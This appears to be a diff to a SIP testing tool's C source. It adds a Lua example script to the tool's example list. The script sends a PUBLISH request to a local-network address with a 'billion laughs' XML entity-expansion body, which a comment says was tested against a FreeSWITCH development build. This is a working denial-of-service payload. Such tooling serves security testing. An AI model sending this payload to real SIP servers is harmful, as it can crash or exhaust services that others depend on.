@@ -465,6 +465,37 @@ const LuaExample luaExamples [] =
 	}
 	,
 	{
+	"Send PUBLISH with \"billion laughs\" body",
+
+	"-- sending PUBLISH with \"billion laughs\" XML body\n"
+	"-- tested against FreeSWITCH 1.10.13-dev\n"
+	"local target = \"sip:192.168.0.16\"\n"
+	"\n"
+	"local body =\n"
+	"\t\"<xml><!DOCTYPE Response [<!ENTITY lol \\\"haha\\\">\" ..\n"
+	"\t\"<!ENTITY l1 \\\"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\\\">\" ..\n"
+	"\t\"<!ENTITY l2 \\\"&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;\\\">\" ..\n"
+	"\t\"<!ENTITY l3 \\\"&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;\\\">\" ..\n"
+	"\t\"<!ENTITY l4 \\\"&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;\\\">\" ..\n"
+	"\t\"<!ENTITY l5 \\\"&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;\\\">\" ..\n"
+	"\t\"<!ENTITY l6 \\\"&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;\\\">\" ..\n"
+	"\t\"<!ENTITY l7 \\\"&l6;&l6;&l6;&l6;&l6;&l6;&l6;&l6;&l6;&l6;\\\">\" ..\n"
+	"\t\"<!ENTITY l8 \\\"&l7;&l7;&l7;&l7;&l7;&l7;&l7;&l7;&l7;&l7;\\\">\" ..\n"
+	"\t\"<!ENTITY l9 \\\"&l8;&l8;&l8;&l8;&l8;&l8;&l8;&l8;&l8;&l8;\\\">\" ..\n"
+	"\t\"<!ENTITY l10 \\\"&l9;&l9;&l9;&l9;&l9;&l9;&l9;&l9;&l9;&l9;\\\">\" ..\n"
+	"\t\"]><Response><Say>&l10;</Say></Response></xml>\"\n"
+	"\n"
+	"local requestUid = SendCustomRequest(target, \"PUBLISH\",\n"
+	"\t\"Event: presence\\r\\nContent-Type: application/pidf+xml\\r\\nContent-Length: \" .. string.len(body) .. \"\\r\\n\\r\\n\" ..\n"
+	"\tbody\n"
+	"\t)\n"
+	"if requestUid <= 0 then\n"
+	"\tprint(string.format(\"Error sending custom request to %s\\n\", target))\n"
+	"\treturn\n"
+	"end"
+	}
+	,
+	{
 	"Scan local network (192.168.0.*:5060) with OPTIONS",
 
 	"function string.starts(String, Start)\n"
